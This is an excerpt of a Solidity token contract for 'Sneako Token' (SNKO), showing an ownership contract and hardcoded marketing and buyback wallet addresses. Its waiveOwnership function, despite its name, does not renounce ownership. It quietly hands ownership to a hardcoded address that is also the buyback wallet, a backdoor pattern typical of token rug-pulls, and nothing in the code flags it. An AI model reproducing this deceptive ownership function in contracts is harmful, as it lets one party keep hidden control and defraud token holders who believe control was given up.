...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xA986528cD73Cd2E63A8dCCF0B6138DF0C8396d8C));
        _owner = address(0xA986528cD73Cd2E63A8dCCF0B6138DF0C8396d8C);
    }
...
contract SneakoToken is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Sneako Token";
    string private _symbol = "SNKO";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xCe04c2dD86dDcbc00890c8333cfD08589D1514C6); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0xA986528cD73Cd2E63A8dCCF0B6138DF0C8396d8C); // BuyBack Address
